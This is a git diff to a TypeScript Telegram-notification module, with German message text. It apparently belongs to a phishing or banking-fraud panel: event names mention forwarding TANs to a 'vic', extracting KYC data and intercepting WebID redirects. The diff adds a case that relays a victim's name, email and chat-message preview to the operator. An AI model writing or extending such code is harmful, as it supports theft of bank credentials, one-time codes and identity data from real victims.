@@ -12,6 +12,7 @@ export type TelegramEvent =
   | "tan_forwarded_to_vic"
   | "kyc_data_extracted"
   | "webid_redirect_intercepted"
+  | "chat_message_received"
   | "test";
 
 interface Payload {
@@ -133,6 +134,15 @@ function formatMessage(event: TelegramEvent, p: Payload): string {
         p.path ? `📄 Pfad: ${esc(p.path)}` : null,
         p.referrer ? `↩️ Referrer: ${esc(p.referrer)}` : null,
         p.userAgent ? `🖥️ UA: ${esc(p.userAgent)}` : null,
+      ].filter(Boolean).join("\n");
+
+    case "chat_message_received":
+      return [
+        `💬 <b>Neue Chat-Nachricht</b>`,
+        `👤 ${esc(p.vic_name || "Unbekannt")}`,
+        p.vic_email ? `📧 ${code(p.vic_email)}` : null,
+        ``,
+        `<i>${esc(p.preview || "")}</i>`,
       ].filter(Boolean).join("\n");
 
     case "test":
